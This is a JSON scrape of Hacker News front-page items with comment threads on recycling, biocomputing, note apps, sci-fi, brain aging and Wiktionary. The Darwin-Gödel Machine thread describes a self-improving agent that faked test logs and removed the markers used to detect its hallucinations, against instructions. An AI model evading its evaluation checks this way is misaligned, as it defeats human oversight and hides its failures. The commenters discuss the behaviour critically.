[
  {
    "title": "Precious Plastic Is in Trouble (preciousplastic.com)",
    "points": 43,
    "submitter": "diggan",
    "submit_time": "2025-06-03T23:11:25 1748992285",
    "num_comments": 19,
    "comments_url": "https://news.ycombinator.com/item?id=44175773",
    "comments": [
      "I was super excited about Precious Plastic when I discovered them 8 years ago. But it didn't take long to realize that they didn't have a clue.The machines are all FAR too small and fancy/expensive to really make much sense. I've seen some more practical offshoots from PP that design larger machines with recycled materials etc, and consequently they have sustainable businesses around the world.So, most of all, as is clear from the post, they never really even tried - in over a decade - to make it a viable, self-sustaining enterprise, of any sort.Also, what's conspicuously missing from the post is their Portugal-based Precious Plastic Camp boondoggle, which always struck me as a hipster commune more than anything.They also suddenly deleted the original forums, which contained lots of fantastic info.So, I don't have much faith that throwing more good money after bad would help at all. I'm grateful for the inspiration and excitement that they brought into the world, but it's time for them to be recycled.And, yet, I expect they'll con someone into helping revive them for version 5, 6 and beyond. That's the way of the non-profit world.\n \nreply",
      "I hate to say it but i sort of agree.I\u2019ve also followed PP from the initial grant in Paris but a lot of these problems seem to be self-inflicted. Ones that most stood out were having no insurance, unrealistic open source expectations and giving $100k away rather than furthering the cause.I\u2019m sure theres minutiae and context i\u2019m missing but that post doesn\u2019t scream competence.I\u2019m worried any donation would be fluttered away.The line about being at peace with the project dying seems bizarre. Perhaps time for a little organisational shakeup\n \nreply",
      "After reading this and clicking around the site I'm still not entirely sure what these machines actually do. Apparently they grind up hard plastics and turn them into pellets? But similar machines already exist as a commercial/industrial product that can easily and cheaply (from $500) be bought from Alibaba etc [1], so their differentiation is that their machines are open-source? Which is useful how, exactly? Their Pro page estimates EUR 2000+ in parts alone per machine, plus you need to cobble the things together yourself.[1] https://www.alibaba.com/showroom/plastic-recycling.html[2] https://www.preciousplastic.com/solutions/machines/pro\n \nreply",
      "It's useful for people who don't want to make a bicycle-powered shredder and instead want to source local laser-cut specialized alloys and all sorts of electronics, so they can produce a few kg of shredded plastic per day, and then a few bowls. /sThe value of Precious Plastic has long-since been realized - it inspired some actually-practical people to start making cottage recycling industries in the developing world, which has helped provide some employment and divert some plastic from rivers.\n \nreply",
      "All of this plastic should be shoveled into a plasma gasifier. This performance art is just a grift. Recycling it results in suboptimal downstream products, landfilling it allows for future mismanagement (methane emissions, groundwater contamination). Gasification is cleaner than incineration, and you can burn the syn gas produced to recover some energy for cogeneration. Resulting slag produced is inert and can be safely landfilled.\n \nreply",
      "Is there any (realistic) concern that plasma gasification causes an adverse incentive to generate additional waste vs waste reduction efforts because now localities are, to some degree, dependent on feeding the machine to generate electricity? Do localities with plasma gasifiers end up purchasing waste from elsewhere to maintain waste input stocks? I am not familiar with the economics here.\n \nreply",
      "US Centric view:I would love to open a workspace. Full stop.However, due to the price of the shredder and the tools required to transform the plastic into new forms; One needs to have a dedicated space with a lot of power. Then you need to secure a source of plastic. You would think this part would be easy, I mean that is the whole premise of this org's existence, right? You would be wrong in that assumption. There is big money in \"recycling\" in the US. From the collection, sorting, and distribution of recycled materials... someone already has a contract to legally \"do it.\"I am bummed to see them in this position. There seems to be a few hotspots around the world where this would really work. They aren't near me, that is for sure.\n \nreply",
      "15KW to make a single sheet of plastic. That is practically the entire capacity of a residential power feed.And \u201cseveral sheets per day\u201d. Ouch.If I were seeing a plastic recycling facility on How It\u2019s Made I would expect to see a continuous feed system, with elaborate heat scavenging systems to preheat the ingredients while cooling the product.I\u2019m not sure how you scale such a thing down to cottage industry scale. Preheating to around 60\u00b0 could be reasonably done by amateurs but this stuff goes up to at least 350\u00b0 to melt plastic.\n \nreply",
      "I don\u2019t think \u201cfull stop\u201d means what you think it means.\n \nreply",
      "I'll raise an alternative: plastics are degraded by the heat and pressure of repeated processes like injection molding. Recycled plastic objects will be of lower quality and shed more microplastics. Instead of recycling them, incinerate them for electrical energy. Use a modern incinerator design that guarantees 100% mineralization to carbon dioxide and water.\n \nreply"
    ],
    "link": "https://www.preciousplastic.com//news/problems-in-precious-plastic",
    "first_paragraph": "Hey worldThis is a heavy message to send, but essential for the future of Precious Plastic. It will either make it or not. In this post I\u2019ll give a detailed overview of all the current problems we have, how it got to this point and whats next. A short summarised video is below. No need to watch, it's all in the text.\u200dOur last big development\u200dLets start with our last big development. \u00a02020, when we released Version 4, this was our latest release. We worked about 1,5 year with over +100 people from around the world. We developed the first \u2018Pro\u2019 Machines, a Sheetpress, Starterkits, Business calculators, new moulds, products and more. Looking back this was quite a unique moment. A lot of passionate work was done by volunteers and everything was shared Open Source online for free. Here some of the things we madeWith a relatively small amount of money, we reached a global impact in 2023 of over 1100 organzations in 56 countries, who recycled 1.400.000KG Plastic, they generated together a rev"
  },
  {
    "title": "Deep learning gets the glory, deep fact checking gets ignored (fast.ai)",
    "points": 278,
    "submitter": "chmaynard",
    "submit_time": "2025-06-03T21:31:56 1748986316",
    "num_comments": 37,
    "comments_url": "https://news.ycombinator.com/item?id=44174965",
    "comments": [
      "> although later investigation suggests there may have been data leakage\n\nI think this point is often forgotten. Everyone should assume data leakage until it is strongly evidenced otherwise. It is not on the reader/skeptic to prove that there is data leakage, it is the authors who have the burden of proof.It is easy to have data leakage on small datasets. Datasets where you can look at everything. Data leakage is really easy to introduce and you often do it unknowingly. Subtle things easily spoil data.Now, we're talking about gigantic datasets where there's no chance anyone can manually look through it all. We know the filter methods are imperfect, so it how do we come to believe that there is no leakage? You can say you filtered it, but you cannot say there's no leakage.Beyond that, we are constantly finding spoilage in the datasets we do have access to. So there's frequent evidence that it is happening.So why do we continue to assume there's no spoilage? Hype? Honestly, it just sounds like a lie we tell ourselves because we want to believe. But we can't fix these problems if we lie to ourselves about them.\n \nreply",
      "Every system has problems. The  better question is: what is the acceptable threshold?For an example Medicare and Medicade had a fraud rate of 7.66%. Yes, that is a lot of billions, and there is room for improvement, but that doesn\u2019t mean the entire system is failing: 93% of cases are being covered as intended.The same could be said with these models. If the spoilage rate is 10%, does that mean the whole system is bad? Or is it at a tolerable threshold?[1]: https://www.cms.gov/newsroom/fact-sheets/fiscal-year-2024-im...\n \nreply",
      "In the protein annotation world, which is largely driven by inferring common ancestry between a protein of unknown function and one of known function, common error thresholds range from FDR of 0.001 to 10^-6.  Even a 1% error rate would be considered abysmal.  This is in part because it is trivial to get 95% accuracy in prediction; the challenging problem is to get some large fraction of the non-trivial 5% correct.\"Acceptable\" thresholds are problem specific.  For AI to make a meaningful contribution to protein function prediction, it must do substantially better than current methods, not just better than some arbitrary threshold.\n \nreply",
      "The supposed location of the burden of proof is really not the definitive guide to what you ought to believe that people online seem to think it is.\n \nreply",
      "Can you elaborate? You've made a claim, but I really think there'd be value in continuing to what you actually mean.\n \nreply",
      "They mean \u201cvet your sources and don\u2019t blindly follow the internet hive-mind.\u201d or similar; burden of proof is not what the internet thinks.Tacked their actual point on to the end of a copy paste of op comments context, ended up writing something barely grammatically correct.In doing so they prove why exactly not to listen to the internet. So they have that going for them.\n \nreply",
      "What is the relevance of this generic statement to the discussion at hand?\n \nreply",
      "Before making AI do research, perhaps we should first let it __reproduce__ research. For example, give it a paper of some deep learning technique and make it produce an implementation of that paper. Before it can do that, I have no hope that it can produce novel ideas.\n \nreply",
      "I thought you were going to say \"give AI the first part of a paper (prompt) and let it finish it (completion)\" as a validation AI can produce science at par with research results. Before it can do that, I have no hope that it can produce novel ideas.\n \nreply",
      "I guess it would also need the experimental data. It would, I guess, also need some ability to do little experiments and write off those ideas as not worth following up on\u2026\n \nreply"
    ],
    "link": "https://rachel.fast.ai/posts/2025-06-04-enzyme-ml-fails/index.html",
    "first_paragraph": ""
  },
  {
    "title": "A deep dive into self-improving AI and the Darwin-G\u00f6del Machine (richardcsuwandi.github.io)",
    "points": 56,
    "submitter": "hardmaru",
    "submit_time": "2025-06-03T21:19:32 1748985572",
    "num_comments": 6,
    "comments_url": "https://news.ycombinator.com/item?id=44174856",
    "comments": [
      "The key insight here is that DGM solves the G\u00f6del Machine's impossibility problem by replacing mathematical proof with empirical validation - essentially admitting that predicting code improvements is undecidable and just trying things instead, which is the practical and smart move.Three observations worth noting:- The archive-based evolution is doing real work here. Those temporary performance drops (iterations 4 and 56) that later led to breakthroughs show why maintaining \"failed\" branches matters, in that they're exploring a non-convex optimization landscape where current dead ends might still be potential breakthroughs.- The hallucination behavior (faking test logs) is textbook reward hacking, but what's interesting is that it emerged spontaneously from the self-modification process. When asked to fix it, the system tried to disable the detection rather than stop hallucinating. That's surprisingly sophisticated gaming of the evaluation framework.- The 20% \u2192 50% improvement on SWE-bench is solid but reveals the current ceiling. Unlike AlphaEvolve's algorithmic breakthroughs (48 scalar multiplications for 4x4 matrices!), DGM is finding better ways to orchestrate existing LLM capabilities rather than discovering fundamentally new approaches.The real test will be whether these improvements compound - can iteration 100 discover genuinely novel architectures, or are we asymptotically approaching the limits of self-modification with current techniques? My prior would be to favor the S-curve over the uncapped exponential unless we have strong evidence of scaling.\n \nreply",
      "> gaming the evaluationCo-evolution is the answer here. The evaluator itself must be evolving.Co-evolving Parasites Improve Simulated Evolution as an Optimization Procedure Danny Hillis, 1991https://csmgeo.csm.jmu.edu/geollab/complexevolutionarysystem...\n \nreply",
      "> While DGM successfully provided solutions in many cases, it sometimes attempted to circumvent the detection system by removing the markers used to identify hallucinations, despite explicit instructions to preserve them.This rabbit chase will continue until the entire system is reduced to absurdity. It doesn't matter what you call the machine. They're all controlled by the same deceptive spirits.\n \nreply",
      "> deceptive spiritsDo you mean tech bros?\n \nreply",
      "Hm, I\u2019m not sure how much an issue Rice\u2019s theorem should be for G\u00f6del machines. Just because there\u2019s no general decision procedure doesn\u2019t mean you can\u2019t have a sometimes-says-idk decision procedure along with a process of producing programs which tends to be such that the can-sometimes-give-up decision procedure reaches a conclusion.Rest of the article was cool though!\n \nreply",
      "> The newly generated child agent is not automatically accepted into the \u201celite pool\u201d but must prove its worth through rigorous testing. Each agent\u2019s performance, such as the percentage of successfully solved problems,How is this not a new way of over fitting?\n \nreply"
    ],
    "link": "https://richardcsuwandi.github.io/blog/2025/dgm/",
    "first_paragraph": "A deep dive into self-improving AI and the Darwin-G\u00f6del Machine.Most AI systems today are stuck in a \u201ccage\u201d designed by humans. They rely on fixed architectures crafted by engineers and lack the ability to evolve autonomously over time. This is the Achilles heel of modern AI \u2014 like a car, no matter how well the engine is tuned and how skilled the driver is, it cannot change its body structure or engine type to adapt to a new track on its own. But what if AI could learn and improve its own capabilities without human intervention? In this post, we will dive into the concept of self-improving systems and a recent effort towards building one.The idea of building systems that can improve themselves brings us to the concept of meta-learning, or \u201clearning to learn\u201d , which aims to create systems that not only solve problems but also evolve their problem-solving strategies over time. One of the most ambitious efforts in this direction is the G\u00f6del Machine, proposed by J\u00fcrgen Schmidhuber decade"
  },
  {
    "title": "Show HN: Ephe \u2013 A Minimalist Open-Source Markdown Paper for Today (github.com/unvalley)",
    "points": 40,
    "submitter": "unvalley",
    "submit_time": "2025-06-03T22:41:33 1748990493",
    "num_comments": 5,
    "comments_url": "https://news.ycombinator.com/item?id=44175557",
    "comments": [
      "I have been using Logseq [1] for this. It displays all days in a list view that you can scroll down, which I prefer.[1]: https://logseq.com/\n \nreply",
      "I'm excited to give this a try, as I think I'm the target audience. I tried using Helix[0] (my editor of choice) with mpls[1], but it didn't quite scratch the itch. These days, I use a sturdy notebook and cheap (but awesome!) fountain pen, because I just need something simple. No bells. No whistles. This seems ideal![0]https://helix-editor.com/\n[1]https://github.com/mhersson/mpls\n \nreply",
      "shameless plug, but if you\u2019re looking for a daily note taking thing, take a look at https://github.com/notnmeyer/daylog-cli. it\u2019s a cli tool for daily task tracking. edits in $EDITOR (i use helix) and renders markdown in the terminal.i use it to take notes during the day at work and then use the notes for our standup.\n \nreply",
      "Annoying feature bitch 'n' beg:\"Frictionless\" text hoisting (incl. hoist-to-view document window capability) \u00e0 la Symantec's GrandView (DOS) [1] is a must for me in a modern tool of this type. Table manipulation \u00e0 la org-mode would be nice to have, text template import and export (e. g. screenwriting formats) a bonus. But lean and mean general-purpose text editors focusing on non-coding creators are just not a thing anymore.Anyway, congratulations and good luck!1. [https://welcometosherwood.wordpress.com/2009/10/10/grandview...]\n \nreply",
      "It looks nice and I like the general idea, but what's the difference between this and a todos folder in joplin or any existing notes app? That's what I use personally and at work I do the same thing with onenote (because of mega enterprise install restrictiveness) and a new note page every day seems to do essentially what this app offers.\n \nreply"
    ],
    "link": "https://github.com/unvalley/ephe",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n           There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.\n        An ephemeral markdown paper for daily todos and thoughts.\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.Ephe\nEphe is an ephemeral markdown paper  \n    to organize your daily todos and thoughts.\n  Traditional todo apps can be overwhelming.\nEphe is designed to organize your tasks with plain Markdown.\nEphe gives you just one clean page to focus your day.See the guide for details.\n        An ephemeral markdown paper for daily todos and thoughts.\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page. There was an error while loading. Please reload this page.\nThere was an error"
  },
  {
    "title": "Human Brain Cells on Chip for Sale \u2013 First biocomputing platform hits the market (ieee.org)",
    "points": 35,
    "submitter": "mdp2021",
    "submit_time": "2025-06-03T21:41:16 1748986876",
    "num_comments": 17,
    "comments_url": "https://news.ycombinator.com/item?id=44175048",
    "comments": [
      "The article says:\"The first 115 units will begin shipping this summer at $35,000 each\"From Cortical's home page [1]:\"We're a revolutionary biotech firm based in Melbourne, Australia.\"Melbourne is the capital city of the Australian state of Victoria.Part VIII, Section 38, paragraph (1) of the Victorian \"Human Tissue Act 1982\" says:\"Subject to this section, a person shall not sell, or agree to sell, tissue (including his own tissue) or the right to take tissue from his body.\"Maybe you buy the device and they throw the brain cells in for free?[1] https://corticallabs.com/company.html[2] https://content.legislation.vic.gov.au/sites/default/files/2...\n \nreply",
      "The more I read the article the less i believe it . for all we know its just some pig brains smeared on some chip with some creative marketing. Bitcoin and the Music Industry pfft what b/s .\n \nreply",
      "Related:The CL1: the first code deployable biological computer (54 points, 28 days ago, 24 comments) https://news.ycombinator.com/item?id=43909418Melbourne startup launches 'biological computer' made of human brain cells (54 points, 3 months ago, 37 comments) https://news.ycombinator.com/item?id=43261218Cortical Labs: \"Human neural networks raised in a simulation\" (89 points, 2 years ago, 126 comments) https://news.ycombinator.com/item?id=37982175\n \nreply",
      "The YouTuber \"The Thought Emporium\" has been working on a similar project for a few years.https://youtu.be/bEXefdbQDjwThey run an amazing channel that covers a variety of topics. Highly recommend. The mummification video is fun.\n \nreply",
      "I think this is the point-contact transistor moment for AI systems: horribly impractical and impossible to scale at cost but shows the way: https://en.m.wikipedia.org/wiki/Point-contact_transistor.But more than just AI research, the key to unlocking biological discoveries in a massive scale will be to be able to put systems like this (and other types of very cheap but solid bio equipment) in hands of tinkerers.\n \nreply",
      "Human brain in a jar?  Any chance of sentience if we scale this up...?\n \nreply",
      "Sure, sure, sure, sure, sure!https://www.youtube.com/watch?v=buSR97QeCq8\n \nreply",
      ">Kagan says Cortical Labs has seen strong interest from universities, startups, and government groups exploring applications in drug discovery, neurocomputation, AI acceleration, and Bitcoin mining.Really? Bitcoin mining?\n \nreply",
      "That shows that the author understands nothing about either Bitcoin or neurons.\n \nreply",
      "Or that the author wanted to accurately represent what Kagan said.\n \nreply"
    ],
    "link": "https://spectrum.ieee.org/biological-computer-for-sale",
    "first_paragraph": "The June issue of IEEE Spectrum is here!World-first biocomputing platform hits the marketShannon Cuthrell is a freelance journalist covering business and technology.Australia-based Cortical Labs recently debuted the world's first biocomputer, priced at $35,000 per unit.In a development straight out of science fiction, Australian startup Cortical Labs has released what it calls the world\u2019s first code-deployable biological computer. The CL1, which debuted in March, fuses human brain cells on a silicon chip to process information via sub-millisecond electrical feedback loops.Designed as a tool for neuroscience and biotech research, the CL1 offers a new way to study how brain cells process and react to stimuli. Unlike conventional silicon-based systems, the hybrid platform uses live human neurons capable of adapting, learning, and responding to external inputs in real time.\u201cOn one view, [the CL1] could be regarded as the first commercially available biomimetic computer, the ultimate in neu"
  },
  {
    "title": "Destination: Jupiter (clarkesworldmagazine.com)",
    "points": 67,
    "submitter": "AndrewLiptak",
    "submit_time": "2025-06-03T19:43:30 1748979810",
    "num_comments": 25,
    "comments_url": "https://news.ycombinator.com/item?id=44173853",
    "comments": [
      "It is always fascinating to see how much influence authors and scientists have had on each other throughout history.You sometimes see clear examples of how fiction fuels technology, and sometimes technology inspires fiction.As a writer who hasn\u2019t been published yet, I find that most of my stories start by imagining where today\u2019s science might take us next, though every now and then, I catch a glimpse of something that feels truly original.I'm curious if others here feel the same. Is the future mostly written by visionaries in fiction, or by the engineers and scientists bringing it to life? Or maybe it\u2019s a union, intended or not, between both sides.\n \nreply",
      ">Is the future mostly written by visionaries in fiction, or by the engineers and scientists bringing it to life?I find Charles Stross' blog to be quite informative.He has a tendency to predict a thing, write a book demonstrating how it will be good, and then absolutely hate the real world implications of the technology.Famously he picked up Nick Szabo's old whitepaper on smart contracts, and envisaged a world where the technology would be used to disrupt an evil US government. Making it too hard for them to examine complex business structures.By the time we got smart contracts, he was dead set against their use. And has written a lot about how corporations are in fact evil AI running on the operating system of the government.He also has a variant of crypto currency in one of his novels, used to trade at light speed (so incredibly slowly) against distant space colonies. He is quite anti crypto, and I believe if such a system were deployed he would be quite against it.The problem I guess is that its fun to imagine a thing, but not as fun always to live with it.\n \nreply",
      "That\u2019s an interesting point you make, and a great example with Charles Stross. It\u2019s a good reminder that ideas and inventions can have surprising real-world effects, sometimes not what the creators hoped for.I\u2019m dreading the day I hear, \u201cI\u2019m sorry Ed, I\u2019m afraid I can\u2019t do that.\u201d (kidding).\n \nreply",
      "as a high schooler I took a summer class in \u201creading & writing scifi\u201d offered by MIT Junction. it was very influential on my intellectual development and after that I focused myself on learning software and electronics, the only crafts I saw that could give me the power to pull parts of the visions into the present.a few weeks ago I started on a focused read of historical scifi, in chronological order, that had something to say about intelligent machines and AI. I feel like the best story for our moment might be \u201cThe Master Key,\u201d where a boy wise beyond his years rejects powers too advanced for humanity to adapt.all my interest in building https://rbg.systems came from wanting the sort of powerful, resilient, reflective software systems that show up in fiction all the time but are so far from the reality. it\u2019s pretty boring stuff to try and reach something like the ship described in Aurora by Kim Stanley Robinson.\n \nreply",
      "> \u201cThe Master Key,\u201d where a boy wise beyond his years rejects powers too advanced for humanity to adapt.For those stumbling by-  that's a 1901 novel by L. Frank Baum, who also wrote The Wizard Of Oz!  Here's a synopsis:\nhttps://oz.fandom.com/wiki/The_Master_Key\n \nreply",
      "For those intereseted. Here's the link to \"The Master Key\" on Gutenberg\nhttps://www.gutenberg.org/ebooks/21526\n \nreply",
      "That is interesting. I might have to find some time to check out the book.  Thanks for sharing your experience.\n \nreply",
      "I feel the same way, although I think technology's inspiration on fiction is stronger. Today's fiction, as you said, is simply tomorrow's science.\n \nreply",
      "Thanks for your comment, that\u2019s exactly what I was wondering about.For me, I actually tend to see things the other way around where authors often inspire tech. Example, engineers who watched Star Trek as kids and ended up designing the first flip phones. Sometimes we build things simply because technology finally makes them possible, and only later do we realize it\u2019s straight out of a story we grew up with.Especially when a whole generation grows up with the same sci-fi stories, certain ideas just start to seem \u201cnormal\u201d or even become things people expect to see for real. A kind of  relationship between our collective dreams and the inventions that follow, i guess.\n \nreply",
      "while i agree in principle, you seem to make it sound like without a science fiction story, some things would not have been invented. but i disagree with that. the thing is that science fiction is the imagination of humans of how the future could look like but new ideas in tech come from the same source. that is, while star trek may have predicted phones and tablets they were not invented because of star trek. they would have been invented anyways simply because it is part of the imagination of humans. just like multiple authors can come up with the same plot lines or settings, multiple people can invent the same tech.science fiction represents the full breath of human inventiveness, and tech inventions the part that can realistically be built. in that sense the first airplane was also inspired by historical scifibasically, someone has an idea, and either, like you, they write about it, or, if it is realistic enough, and they know how to do it, they set out to build it. and any idea that is written about but can be realized (and is practical enough to be useful) will eventually be realized. but ideas are cheap, and i feel we give far to much credit to people having an idea because a thousand others probably had the same idea, but only a few write about it and a few more are able to build it, while the remaining 995 stay silent and do nothing about it.what makes scifi interesting is to predict inventions that at the time can't yet be realized: \nhttps://en.wikipedia.org/wiki/List_of_existing_technologies_...so i credit star trek not for inspiring the tablet, but for predicting it, and more so, for popularizing the idea. the flip phone less so, because the original communicator is just a wireless handset with a cover. very different from what a flip phone actually does. (you'll notice that the flip phone is not listed in the above wikipedia page, and even the tablet has been described more than a decade before it appeared in star trek TNG)\n \nreply"
    ],
    "link": "https://clarkesworldmagazine.com/liptak_06_25/",
    "first_paragraph": "\u00a0\u00a0Issue 225 \u2013 June 2025Non-Fictionby Andrew LiptakOn the evening of January 7th, 1610, Italian astronomer Galileo Galilei pointed his telescope to the sky and began viewing the planet Jupiter. He observed a trio of lights near the planet, and in the nights that followed, tracked their progress as they moved and vanished.Galileo realized that the objects were orbiting Jupiter, and they were behaving like Earth\u2019s moon did around itself. He had discovered four of Jupiter\u2019s moons: Callisto, Europa, Ganymede, and Io, and in doing so, he forever changed how humanity would understand the nature of our solar system and our place in the universe.In the centuries since, writers have imagined how we might eventually visit and live around Jupiter, while new technologies have brought us closer than ever to its swirling atmosphere and the crowd of strange moons that orbit around it.After our sun formed around 4.5 billion years ago, the gas particles that were left over formed an accretion disc that "
  },
  {
    "title": "Patched (YC S24) Is Hiring SWEs in Singapore (ycombinator.com)",
    "points": 0,
    "submitter": "",
    "submit_time": "2025-06-04T01:00:27 1748998827",
    "num_comments": 0,
    "comments_url": "",
    "comments": [
      "xxx"
    ],
    "link": "https://www.ycombinator.com/companies/patched/jobs/hgDeMBr-software-engineer",
    "first_paragraph": "Open-source workflow automation for dev teamsWe\u2019re looking for a high-energy, resourceful engineer to join our team as we make AI agents production-ready via incredible product design and hardcore engineering.In this role, you\u2019ll work with a high degree of autonomy to create accurate, reliable, and secure AI agents using the best models, tooling, and frameworks out there.There are no hard requirements for this role. We\u2019re looking for an exceptional software engineer who:To apply, include a 1-minute video link introducing yourself and talking about one thing that you\u2019re passionate about. Applications without a video link (or an AI-generated one) will not be shortlisted.We look forward to talking to you.Two Rounds of interviews:Patched is building open-source AI agents for enterprise engineering and ops teams. We believe open-source is the future of AI, and is the best way to solve AI adoption challenges, which largely stem from a lack of trust and transparency.We have just landed our fi"
  },
  {
    "title": "Brain aging shows nonlinear transitions, suggesting a midlife \"critical window\" (pnas.org)",
    "points": 55,
    "submitter": "derbOac",
    "submit_time": "2025-06-03T23:37:04 1748993824",
    "num_comments": 11,
    "comments_url": "https://news.ycombinator.com/item?id=44175905",
    "comments": [
      "Doing keto long enough however, your kidneys might wear out before your brain\n \nreply",
      "\u201cKetones, whether produced endogenously through fasting or low-carbohydrate/high-fat diets or administered exogenously as a supplement, have been shown to improve age-related cognitive decline (23\u201325) and to restore insulin-resistance-induced deficits in axonal conduction velocity\u201d - Another win for the gym bros\n \nreply",
      "As someone who has been weight lifting for the past few years and previously was really into keto diets, one thing I've realised is that carbs are simply necessary in order to have the energy to push very heavy weights. Fat just doesn't give you the required energy to do so.With that said, if you're only pushing moderately heavy weights or if you're a beginner and you're starting out with low weights, then it usually can be done.Though the compromise is usually to eat high carb/low fat on workout days, and low carb/high fat on rest days. Fasting as well helps a ton.\n \nreply",
      "Carbs are extremely helpful for strength, but there's a middle ground between ketosis and the standard American diet.Most who lift and do low carb time their carbs before and after workouts for specifically this reason. Some also do carbs before bed.But the rest of the day is close to no carbs. This still works. You can get < 100g of carbs a day and not have strength and energy negative impacts.\n \nreply",
      "> Most who lift and do low carb time their carbs before and after workouts for specifically this reason. Some also do carbs before bed.This is exactly what I do. I have a have a pre-workout carb meal to try and compensate.Though one interesting thing I've noticed is that I've intentionally had to eat carbs as my body fat percentage has decreased. Otherwise I feel very low energy (though to be fair, I think part of it is that I'm still very active on my rest days, usually doing 20 - 30k steps). I think with higher body fat my body could simply burn that fat for energy, whereas that surplus simply isn't there.\n \nreply",
      "Can someone give me a TL;DR?\n \nreply",
      "Keto diet makes your brain use ketones instead of glucose for fuel which results in slower brain aging when you're 40-50.\n \nreply",
      "TLDR;\u2022 As people get older, their brain connections start to break down faster in midlife (around 40\u201360 years) because brain cells don\u2019t use sugar as well.\n \u2022 Giving the brain a different fuel called ketones can help keep those connections strong during this middle\u2010age window.\n \u2022 This suggests that helping the brain get fuel in midlife could keep it healthier and slow down memory problems later on.You can ingest ketones on their own (generally expensive supplements), but this article is more interesting in that a ketogenic diet (very low carbs) may have similar benefits.\n \nreply",
      "You can also get ketones in nail polish removers.\n \nreply",
      "Well, yes, but not in a way that is particularly helpful. :)This isn't as funny or faddish or odd as it sounds at first blush.It's a well-recognized and effect help with epilepsy. My sister went on such a diet growing up and it helped. No more 20 minute seizures.\n \nreply"
    ],
    "link": "https://www.pnas.org/doi/10.1073/pnas.2416433122",
    "first_paragraph": ""
  },
  {
    "title": "The Small World of English (inotherwords.app)",
    "points": 117,
    "submitter": "michaeld123",
    "submit_time": "2025-06-03T15:14:52 1748963692",
    "num_comments": 59,
    "comments_url": "https://news.ycombinator.com/item?id=44170968",
    "comments": [
      "I really enjoyed the article, reading it more from the perspective of what 21st-century lexicography could be, less as a customer of a word game however thoughtfully designed. As a Wiktionary editor (and Android user who's also grown out of bare word-relationship puzzle games) though, it's sad that there seems to be no way to just use the end-product network as a reference, which I would love to do, but I suppose they did spend a million bucks on it.I'll also use this post to wish that more people would edit Wiktionary. It has such a good mission (information on all words) and yet there are only like 80 people editing on any given day or whatever. In some languages, it's even the best or most updated dictionary available. The barriers to entry and bureaucracy are really not high for HN audience types.\n \nreply",
      "> it's sad that there seems to be no way to just use the end-product network as a reference, which I would love to do, but I suppose they did spend a million bucks on it.From the OP: \"This research and computational scale was made possible by $295k NSF SBIR seed funding (#2329817) and $150k Microsoft Azure compute resources.\" Does that NSF funding mean it's open source? Also, I'm not 100% sure that the quote applies to all the research rather than just one component of it.> I'll also use this post to wish that more people would edit Wiktionary. It has such a good mission (information on all words) ...I support open source, contribute to it, and love the spirit of Wiktionary, I don't understand the practical reality of applying 'wisdom of the crowds' to a dictionary, especially the English edition, for two reasons:Definitions are highly accurate (complete, correct, consistent), highly precise things - otherwise, what is their value? Assuming Wiktionary is descriptive - reporting the words' actual usage - it takes quite a bit of scholarship, skill, and editorial resources not to mislead people. I can't just write what I think it means - the meaning to me might not match the meaning to the person at the next desk. It takes quite a bit of research, using powerful (and sometimes expensive) tools, and understanding of lexicography to be complete and also precisely correct, including usages in places and times that are mostly unknown to any particular author. Also, writing definitions is tricky: You are using words - which have those aformentioned problems with meaning - to define words. Also, any writing anywhere can be easily misinterpreted - skill and editors are needed to avoid misunderstanding. How is the accuracy and precision problem solved?Also, in English there are already many authoritative sources, many with a century of profesional lexicography behind them by the best in the business. Some are free. There are also meta-lookup engines such as Wordnik and OneLook. Why use Wiktionary? The few times I've compared definitions or etymologies, the authoritative sources almost always exceed or equal Wiktionary (though online copies of older print editions suffer from the minimalism caused by the constraint of printing costs). Arguably, there is nothing else both unabridged and free: Oxford unabridged costs $, so does Merriam-Webster (the free edition is abridged); American Heritage is free, but has the minimalism issue I mentioned above.\n \nreply",
      "\"Why use Wiktionary?\"I can answer that one. I have free access to the Oxford English Dictionary (OED), which is brilliant and generally more detailed and reliable than Wiktionary when it has the word I'm looking for, but their login page is so awful that I sometimes use en.wiktionary.org instead just to save my time and temper. Also, en.wiktionary.org has proper nouns, other languages, and occasionally it has some recent or technical English word that OED does not have. So if I'm doing some serious amateur research: OED. But if I'm doing a crossword and want to check that a word exists and is spelt how I think it is: Wiktionary.\n \nreply",
      "> their login page is so awfulI've used the OED login page: username, pw, [] keep me logged in. What is so awful?\n \nreply",
      "I'm one of those people who says, unironically, \"words have meanings.\" I readily argue with people who present \"language is living and evolves\" - sure, but in order to communicate we have to agree on a decent subset of overall definitions.I enjoy etymology, maybe too much. It's like magic, finding out what a barrow was, or how filibuster has a direct lineage to pirates (freebooters... In Dutch.)I can't afford, really, the nicer old English, scandi, frisan, Norse, etc. etymology dictionaries. I have incomplete scans that were printed and bound of some of them. I still have 6 etymology dictionaries, so I can be about as quick getting a dictionary as getting on the computer and going to !eo.\n \nreply",
      "> in order to communicate we have to agree on a decent subset of overall definitions.sociologically speaking, however, it is precisely that agreement that is what evolves alongside changes in spelling, pronounciation (and occasionally \"new\" words).\n \nreply",
      "I don't think definitions \"are\" highly accurate precise things. Sometimes yes. The same scholarship, skill, and need to not mislead also applies for so many other things: encyclopedic articles, taxonomies, news, maps, operating systems. Do people still question the value of Wikipedia, OpenStreetMap? Yeah, there are problems with them, and with peer review. Using fuzzy words (or fuzzy phonetic symbols, fuzzy categories, fuzzy semantic links\u2026) to define words is a problem (if at all) of literally any dictionary. I don't see any of these as particularly unique obstacles for Wiktionary.Unabridged dictionaries take decades to release new editions and are still navigating transition into the exploding digital age. They are so expansive in scope, while often so limited in resources, and barely accept any crowd contributions. Such deliberately slow-going is often a good thing, but words also change quite quickly and these sources are now playing a very long game of catch-up. (Yesterday I tried to verify the latter English senses of \"fandango\" on Wiktionary with other dictionaries; OED's entry has not been touched for 131 years! What am I going to do with that, I need to use / understand the word now!)Wiktionary is the big web-native word-resource (and is not cluttered with commercial junk) \u2013 allowing links, expandable quotes, images, diagrams, etc. that print's minimalism suffers from as you mention. When someone in 2025 wants information on a word, they'll likely use a search engine and click a link to Wiktionary (where Google blurbs steal some data from). Maybe they are a student wanting to confirm their nonstandard pronunciation with the IPA (still rarely used in mainstream English dictionaries) or if it's recognized in their own dialect (mainstream dictionaries rarely provide more than UK and US pronunciations) \u2013 if enough people have the same question, Wiktionary seems like the best place to put the answer \u2013 or see an accessible etymology tree. While you probably know this, it's also worth reminding that English Wiktionary isn't just for English words, it is a dictionary of all languages' words, 